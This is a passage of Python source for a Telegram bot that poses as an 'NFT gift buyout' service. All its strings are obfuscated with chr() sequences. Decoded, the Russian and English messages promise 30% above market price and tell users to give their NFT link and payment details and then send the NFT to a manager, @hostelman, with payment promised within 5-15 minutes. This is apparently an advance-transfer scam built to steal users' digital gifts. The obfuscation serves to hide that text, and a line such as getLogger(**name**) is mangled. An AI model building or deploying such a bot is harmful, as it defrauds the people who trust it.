import logging
import random
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
Application, CommandHandler, CallbackQueryHandler,
MessageHandler, filters, ContextTypes, ConversationHandler
)

TOKEN = open(chr(116)+chr(111)+chr(107)+chr(101)+chr(110)+chr(46)+chr(116)+chr(120)+chr(116)).read().strip()
ADMIN_ID = int(open(chr(97)+chr(100)+chr(109)+chr(105)+chr(110)+chr(46)+chr(116)+chr(120)+chr(116)).read().strip())
MANAGER = open(chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)+chr(114)+chr(46)+chr(116)+chr(120)+chr(116)).read().strip()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(**name**)

LANG, MAIN_MENU, SELL_NFT_LINK, SELL_CURRENCY, SELL_CONFIRM, SELL_REQUISITES = range(6)

TEXTS = {
chr(114)+chr(117): {
chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101): chr(1055)+chr(1088)+chr(1080)+chr(1074)+chr(1077)+chr(1090)+chr(1089)+chr(1090)+chr(1074)+chr(1091)+chr(1102)+chr(33)+chr(32)+chr(1069)+chr(1090)+chr(1086)+chr(32)+chr(1040)+chr(1074)+chr(1090)+chr(1086)+chr(1084)+chr(1072)+chr(1090)+chr(1080)+chr(1095)+chr(1077)+chr(1089)+chr(1082)+chr(1072)+chr(1103)+chr(32)+chr(1057)+chr(1082)+chr(1091)+chr(1087)+chr(1082)+chr(1072)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1082)+chr(1086)+chr(1074)+chr(32)+chr(1074)+chr(32)+chr(84)+chr(101)+chr(108)+chr(101)+chr(103)+chr(114)+chr(97)+chr(109)+chr(10)+chr(10)+chr(1052)+chr(1099)+chr(32)+chr(1074)+chr(1099)+chr(1082)+chr(1091)+chr(1087)+chr(1072)+chr(1077)+chr(1084)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1082)+chr(1080)+chr(32)+chr(1074)+chr(1099)+chr(1096)+chr(1077)+chr(32)+chr(1088)+chr(1099)+chr(1085)+chr(1086)+chr(1095)+chr(1085)+chr(1086)+chr(1081)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1099)+chr(32)+chr(1085)+chr(1072)+chr(32)+chr(51)+chr(48)+chr(37)+chr(32)+chr(8212)+chr(32)+chr(1073)+chr(1099)+chr(1089)+chr(1090)+chr(1088)+chr(1086)+chr(44)+chr(32)+chr(1073)+chr(1077)+chr(1079)+chr(1086)+chr(1087)+chr(1072)+chr(1089)+chr(1085)+chr(1086)+chr(32)+chr(1080)+chr(32)+chr(1095)+chr(1077)+chr(1089)+chr(1090)+chr(1085)+chr(1086)+chr(46)+chr(10)+chr(10)+chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1076)+chr(1077)+chr(1081)+chr(1089)+chr(1090)+chr(1074)+chr(1080)+chr(1077)+chr(58),
chr(104)+chr(111)+chr(119)+chr(95)+chr(119)+chr(111)+chr(114)+chr(107)+chr(115): chr(1050)+chr(1072)+chr(1082)+chr(32)+chr(1087)+chr(1088)+chr(1086)+chr(1074)+chr(1086)+chr(1076)+chr(1080)+chr(1090)+chr(1089)+chr(1103)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(63)+chr(10)+chr(10)+chr(49)+chr(46)+chr(32)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1091)+chr(32)+chr(1085)+chr(1072)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1086)+chr(1082)+chr(10)+chr(50)+chr(46)+chr(32)+chr(1041)+chr(1086)+chr(1090)+chr(32)+chr(1089)+chr(1095)+chr(1080)+chr(1090)+chr(1072)+chr(1077)+chr(1090)+chr(32)+chr(1089)+chr(1090)+chr(1086)+chr(1080)+chr(1084)+chr(1086)+chr(1089)+chr(1090)+chr(1100)+chr(58)+chr(32)+chr(1084)+chr(1086)+chr(1076)+chr(1077)+chr(1083)+chr(1100)+chr(44)+chr(32)+chr(1092)+chr(1086)+chr(1085)+chr(44)+chr(32)+chr(1091)+chr(1079)+chr(1086)+chr(1088)+chr(10)+chr(51)+chr(46)+chr(32)+chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1087)+chr(1086)+chr(1089)+chr(1086)+chr(1073)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1099)+chr(10)+chr(52)+chr(46)+chr(32)+chr(1041)+chr(1086)+chr(1090)+chr(32)+chr(1087)+chr(1088)+chr(1077)+chr(1076)+chr(1083)+chr(1072)+chr(1075)+chr(1072)+chr(1077)+chr(1090)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1091)+chr(32)+chr(43)+chr(51)+chr(48)+chr(37)+chr(32)+chr(1082)+chr(32)+chr(1088)+chr(1099)+chr(1085)+chr(1082)+chr(1091)+chr(10)+chr(53)+chr(46)+chr(32)+chr(1055)+chr(1086)+chr(1076)+chr(1090)+chr(1074)+chr(1077)+chr(1088)+chr(1076)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1091)+chr(10)+chr(54)+chr(46)+chr(32)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(1091)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(32)+chr(1080)+chr(32)+chr(1087)+chr(1086)+chr(1083)+chr(1091)+chr(1095)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1091),
chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(1055)+chr(1086)+chr(1076)+chr(1076)+chr(1077)+chr(1088)+chr(1078)+chr(1082)+chr(1072)+chr(10)+chr(10)+chr(1055)+chr(1086)+chr(32)+chr(1074)+chr(1089)+chr(1077)+chr(1084)+chr(32)+chr(1074)+chr(1086)+chr(1087)+chr(1088)+chr(1086)+chr(1089)+chr(1072)+chr(1084)+chr(58)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(10)+chr(1056)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1072)+chr(1077)+chr(1084)+chr(32)+chr(50)+chr(52)+chr(47)+chr(55)+chr(33),
chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1091)+chr(32)+chr(1085)+chr(1072)+chr(32)+chr(1074)+chr(1072)+chr(1096)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1087)+chr(1086)+chr(1076)+chr(1072)+chr(1088)+chr(1086)+chr(1082)+chr(10)+chr(1055)+chr(1088)+chr(1080)+chr(1084)+chr(1077)+chr(1088)+chr(58)+chr(32)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(80)+chr(108)+chr(117)+chr(115)+chr(104)+chr(80)+chr(101)+chr(112)+chr(101)+chr(45)+chr(50)+chr(49)+chr(51)+chr(51),
chr(105)+chr(110)+chr(118)+chr(97)+chr(108)+chr(105)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(1069)+chr(1090)+chr(1086)+chr(32)+chr(1085)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1072)+chr(32)+chr(78)+chr(70)+chr(84)+chr(46)+chr(32)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1091)+chr(32)+chr(1074)+chr(1080)+chr(1076)+chr(1072)+chr(58)+chr(10)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(1053)+chr(1072)+chr(1079)+chr(1074)+chr(1072)+chr(1085)+chr(1080)+chr(1077)+chr(45)+chr(1053)+chr(1086)+chr(1084)+chr(1077)+chr(1088),
chr(99)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(95)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121): chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1089)+chr(1087)+chr(1086)+chr(1089)+chr(1086)+chr(1073)+chr(32)+chr(1087)+chr(1086)+chr(1083)+chr(1091)+chr(1095)+chr(1077)+chr(1085)+chr(1080)+chr(1103)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1099)+chr(58),
chr(111)+chr(102)+chr(102)+chr(101)+chr(114): chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(1056)+chr(1099)+chr(1085)+chr(1086)+chr(1095)+chr(1085)+chr(1072)+chr(1103)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1072)+chr(58)+chr(32)+chr(126)+chr(123)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(1052)+chr(1086)+chr(1103)+chr(32)+chr(1094)+chr(1077)+chr(1085)+chr(1072)+chr(32)+chr(40)+chr(43)+chr(51)+chr(48)+chr(37)+chr(41)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(10)+chr(1057)+chr(1086)+chr(1075)+chr(1083)+chr(1072)+chr(1089)+chr(1085)+chr(1099)+chr(63),
chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(105)+chr(115)+chr(105)+chr(116)+chr(101)+chr(115): chr(1042)+chr(1074)+chr(1077)+chr(1076)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1088)+chr(1077)+chr(1082)+chr(1074)+chr(1080)+chr(1079)+chr(1080)+chr(1090)+chr(1099)+chr(32)+chr(1076)+chr(1083)+chr(1103)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1099)+chr(32)+chr(40)+chr(123)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121)+chr(125)+chr(41)+chr(58),
chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(114)+chr(101)+chr(97)+chr(116)+chr(101)+chr(100): chr(1057)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(32)+chr(1086)+chr(1092)+chr(1086)+chr(1088)+chr(1084)+chr(1083)+chr(1077)+chr(1085)+chr(1072)+chr(33)+chr(10)+chr(10)+chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(1057)+chr(1091)+chr(1084)+chr(1084)+chr(1072)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(1056)+chr(1077)+chr(1082)+chr(1074)+chr(1080)+chr(1079)+chr(1080)+chr(1090)+chr(1099)+chr(58)+chr(32)+chr(123)+chr(114)+chr(101)+chr(113)+chr(125)+chr(10)+chr(10)+chr(1054)+chr(1090)+chr(1087)+chr(1088)+chr(1072)+chr(1074)+chr(1100)+chr(1090)+chr(1077)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(1091)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(1055)+chr(1086)+chr(1089)+chr(1083)+chr(1077)+chr(32)+chr(1087)+chr(1086)+chr(1083)+chr(1091)+chr(1095)+chr(1077)+chr(1085)+chr(1080)+chr(1103)+chr(32)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(32)+chr(1087)+chr(1077)+chr(1088)+chr(1077)+chr(1074)+chr(1077)+chr(1076)+chr(1105)+chr(1090)+chr(32)+chr(1086)+chr(1087)+chr(1083)+chr(1072)+chr(1090)+chr(1091)+chr(32)+chr(1074)+chr(32)+chr(1090)+chr(1077)+chr(1095)+chr(1077)+chr(1085)+chr(1080)+chr(1077)+chr(32)+chr(53)+chr(45)+chr(49)+chr(53)+chr(32)+chr(1084)+chr(1080)+chr(1085)+chr(1091)+chr(1090)+chr(46),
chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100): chr(1057)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(32)+chr(1086)+chr(1090)+chr(1084)+chr(1077)+chr(1085)+chr(1077)+chr(1085)+chr(1072)+chr(46),
chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(101)+chr(108)+chr(108): chr(1055)+chr(1088)+chr(1086)+chr(1076)+chr(1072)+chr(1090)+chr(1100)+chr(32)+chr(78)+chr(70)+chr(84),
chr(98)+chr(116)+chr(110)+chr(95)+chr(104)+chr(111)+chr(119): chr(1050)+chr(1072)+chr(1082)+chr(32)+chr(1087)+chr(1088)+chr(1086)+chr(1074)+chr(1086)+chr(1076)+chr(1080)+chr(1090)+chr(1089)+chr(1103)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(63),
chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(1055)+chr(1086)+chr(1076)+chr(1076)+chr(1077)+chr(1088)+chr(1078)+chr(1082)+chr(1072),
chr(98)+chr(116)+chr(110)+chr(95)+chr(121)+chr(101)+chr(115): chr(1044)+chr(1072)+chr(44)+chr(32)+chr(1089)+chr(1086)+chr(1075)+chr(1083)+chr(1072)+chr(1089)+chr(1077)+chr(1085),
chr(98)+chr(116)+chr(110)+chr(95)+chr(110)+chr(111): chr(1053)+chr(1077)+chr(1090)+chr(44)+chr(32)+chr(1086)+chr(1090)+chr(1082)+chr(1072)+chr(1079)+chr(1072)+chr(1090)+chr(1100)+chr(1089)+chr(1103),
chr(98)+chr(116)+chr(110)+chr(95)+chr(98)+chr(97)+chr(99)+chr(107): chr(1053)+chr(1072)+chr(1079)+chr(1072)+chr(1076),
},
chr(101)+chr(110): {
chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101): chr(87)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)+chr(33)+chr(32)+chr(65)+chr(117)+chr(116)+chr(111)+chr(109)+chr(97)+chr(116)+chr(105)+chr(99)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(71)+chr(105)+chr(102)+chr(116)+chr(32)+chr(66)+chr(117)+chr(121)+chr(111)+chr(117)+chr(116)+chr(32)+chr(66)+chr(111)+chr(116)+chr(10)+chr(10)+chr(87)+chr(101)+chr(32)+chr(98)+chr(117)+chr(121)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(103)+chr(105)+chr(102)+chr(116)+chr(115)+chr(32)+chr(51)+chr(48)+chr(37)+chr(32)+chr(97)+chr(98)+chr(111)+chr(118)+chr(101)+chr(32)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(46)+chr(10)+chr(10)+chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(97)+chr(110)+chr(32)+chr(97)+chr(99)+chr(116)+chr(105)+chr(111)+chr(110)+chr(58),
chr(104)+chr(111)+chr(119)+chr(95)+chr(119)+chr(111)+chr(114)+chr(107)+chr(115): chr(72)+chr(111)+chr(119)+chr(32)+chr(100)+chr(111)+chr(101)+chr(115)+chr(32)+chr(116)+chr(104)+chr(101)+chr(32)+chr(100)+chr(101)+chr(97)+chr(108)+chr(32)+chr(119)+chr(111)+chr(114)+chr(107)+chr(63)+chr(10)+chr(10)+chr(49)+chr(46)+chr(32)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(97)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(32)+chr(116)+chr(111)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(103)+chr(105)+chr(102)+chr(116)+chr(10)+chr(50)+chr(46)+chr(32)+chr(66)+chr(111)+chr(116)+chr(32)+chr(99)+chr(97)+chr(108)+chr(99)+chr(117)+chr(108)+chr(97)+chr(116)+chr(101)+chr(115)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(58)+chr(32)+chr(109)+chr(111)+chr(100)+chr(101)+chr(108)+chr(44)+chr(32)+chr(98)+chr(97)+chr(99)+chr(107)+chr(103)+chr(114)+chr(111)+chr(117)+chr(110)+chr(100)+chr(44)+chr(32)+chr(112)+chr(97)+chr(116)+chr(116)+chr(101)+chr(114)+chr(110)+chr(10)+chr(51)+chr(46)+chr(32)+chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(109)+chr(101)+chr(116)+chr(104)+chr(111)+chr(100)+chr(10)+chr(52)+chr(46)+chr(32)+chr(66)+chr(111)+chr(116)+chr(32)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(115)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(32)+chr(43)+chr(51)+chr(48)+chr(37)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(10)+chr(53)+chr(46)+chr(32)+chr(67)+chr(111)+chr(110)+chr(102)+chr(105)+chr(114)+chr(109)+chr(32)+chr(116)+chr(104)+chr(101)+chr(32)+chr(100)+chr(101)+chr(97)+chr(108)+chr(10)+chr(54)+chr(46)+chr(32)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)+chr(114)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(32)+chr(97)+chr(110)+chr(100)+chr(32)+chr(114)+chr(101)+chr(99)+chr(101)+chr(105)+chr(118)+chr(101)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116),
chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(83)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116)+chr(10)+chr(10)+chr(67)+chr(111)+chr(110)+chr(116)+chr(97)+chr(99)+chr(116)+chr(58)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(10)+chr(65)+chr(118)+chr(97)+chr(105)+chr(108)+chr(97)+chr(98)+chr(108)+chr(101)+chr(32)+chr(50)+chr(52)+chr(47)+chr(55)+chr(33),
chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(116)+chr(104)+chr(101)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(32)+chr(116)+chr(111)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(103)+chr(105)+chr(102)+chr(116)+chr(10)+chr(69)+chr(120)+chr(97)+chr(109)+chr(112)+chr(108)+chr(101)+chr(58)+chr(32)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(80)+chr(108)+chr(117)+chr(115)+chr(104)+chr(80)+chr(101)+chr(112)+chr(101)+chr(45)+chr(50)+chr(49)+chr(51)+chr(51),
chr(105)+chr(110)+chr(118)+chr(97)+chr(108)+chr(105)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107): chr(84)+chr(104)+chr(105)+chr(115)+chr(32)+chr(105)+chr(115)+chr(32)+chr(110)+chr(111)+chr(116)+chr(32)+chr(97)+chr(110)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(46)+chr(32)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(97)+chr(32)+chr(108)+chr(105)+chr(110)+chr(107)+chr(32)+chr(108)+chr(105)+chr(107)+chr(101)+chr(58)+chr(10)+chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47)+chr(78)+chr(97)+chr(109)+chr(101)+chr(45)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114),
chr(99)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(95)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121): chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(109)+chr(101)+chr(116)+chr(104)+chr(111)+chr(100)+chr(58),
chr(111)+chr(102)+chr(102)+chr(101)+chr(114): chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(77)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(58)+chr(32)+chr(126)+chr(123)+chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(77)+chr(121)+chr(32)+chr(112)+chr(114)+chr(105)+chr(99)+chr(101)+chr(32)+chr(40)+chr(43)+chr(51)+chr(48)+chr(37)+chr(41)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(10)+chr(68)+chr(111)+chr(32)+chr(121)+chr(111)+chr(117)+chr(32)+chr(97)+chr(103)+chr(114)+chr(101)+chr(101)+chr(63),
chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(105)+chr(115)+chr(105)+chr(116)+chr(101)+chr(115): chr(69)+chr(110)+chr(116)+chr(101)+chr(114)+chr(32)+chr(121)+chr(111)+chr(117)+chr(114)+chr(32)+chr(112)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(100)+chr(101)+chr(116)+chr(97)+chr(105)+chr(108)+chr(115)+chr(32)+chr(40)+chr(123)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121)+chr(125)+chr(41)+chr(58),
chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(114)+chr(101)+chr(97)+chr(116)+chr(101)+chr(100): chr(68)+chr(101)+chr(97)+chr(108)+chr(32)+chr(99)+chr(111)+chr(110)+chr(102)+chr(105)+chr(114)+chr(109)+chr(101)+chr(100)+chr(33)+chr(10)+chr(10)+chr(78)+chr(70)+chr(84)+chr(58)+chr(32)+chr(123)+chr(108)+chr(105)+chr(110)+chr(107)+chr(125)+chr(10)+chr(65)+chr(109)+chr(111)+chr(117)+chr(110)+chr(116)+chr(58)+chr(32)+chr(123)+chr(111)+chr(102)+chr(102)+chr(101)+chr(114)+chr(125)+chr(32)+chr(123)+chr(115)+chr(121)+chr(109)+chr(125)+chr(10)+chr(68)+chr(101)+chr(116)+chr(97)+chr(105)+chr(108)+chr(115)+chr(58)+chr(32)+chr(123)+chr(114)+chr(101)+chr(113)+chr(125)+chr(10)+chr(10)+chr(83)+chr(101)+chr(110)+chr(100)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(116)+chr(111)+chr(32)+chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)+chr(114)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110)+chr(10)+chr(80)+chr(97)+chr(121)+chr(109)+chr(101)+chr(110)+chr(116)+chr(32)+chr(119)+chr(105)+chr(108)+chr(108)+chr(32)+chr(98)+chr(101)+chr(32)+chr(115)+chr(101)+chr(110)+chr(116)+chr(32)+chr(119)+chr(105)+chr(116)+chr(104)+chr(105)+chr(110)+chr(32)+chr(53)+chr(45)+chr(49)+chr(53)+chr(32)+chr(109)+chr(105)+chr(110)+chr(117)+chr(116)+chr(101)+chr(115)+chr(46),
chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100): chr(68)+chr(101)+chr(97)+chr(108)+chr(32)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100)+chr(46),
chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(101)+chr(108)+chr(108): chr(83)+chr(101)+chr(108)+chr(108)+chr(32)+chr(78)+chr(70)+chr(84),
chr(98)+chr(116)+chr(110)+chr(95)+chr(104)+chr(111)+chr(119): chr(72)+chr(111)+chr(119)+chr(32)+chr(100)+chr(111)+chr(101)+chr(115)+chr(32)+chr(105)+chr(116)+chr(32)+chr(119)+chr(111)+chr(114)+chr(107)+chr(63),
chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116): chr(83)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116),
chr(98)+chr(116)+chr(110)+chr(95)+chr(121)+chr(101)+chr(115): chr(89)+chr(101)+chr(115)+chr(44)+chr(32)+chr(97)+chr(103)+chr(114)+chr(101)+chr(101),
chr(98)+chr(116)+chr(110)+chr(95)+chr(110)+chr(111): chr(78)+chr(111)+chr(44)+chr(32)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108),
chr(98)+chr(116)+chr(110)+chr(95)+chr(98)+chr(97)+chr(99)+chr(107): chr(66)+chr(97)+chr(99)+chr(107),
},
}

CURRENCIES = {
chr(67)+chr(114)+chr(121)+chr(112)+chr(116)+chr(111)+chr(66)+chr(111)+chr(116): {chr(115)+chr(121)+chr(109): chr(85)+chr(83)+chr(68)+chr(84), chr(114)+chr(97)+chr(116)+chr(101): 1.0},
chr(84)+chr(82)+chr(67)+chr(50)+chr(48)+chr(32)+chr(40)+chr(85)+chr(83)+chr(68)+chr(84)+chr(41): {chr(115)+chr(121)+chr(109): chr(85)+chr(83)+chr(68)+chr(84), chr(114)+chr(97)+chr(116)+chr(101): 1.0},
chr(84)+chr(111)+chr(110)+chr(107)+chr(101)+chr(101)+chr(112)+chr(101)+chr(114)+chr(32)+chr(40)+chr(84)+chr(79)+chr(78)+chr(41): {chr(115)+chr(121)+chr(109): chr(84)+chr(79)+chr(78), chr(114)+chr(97)+chr(116)+chr(101): 0.18},
chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(85)+chr(107)+chr(114)+chr(97)+chr(105)+chr(110)+chr(101): {chr(115)+chr(121)+chr(109): chr(85)+chr(65)+chr(72), chr(114)+chr(97)+chr(116)+chr(101): 40.0},
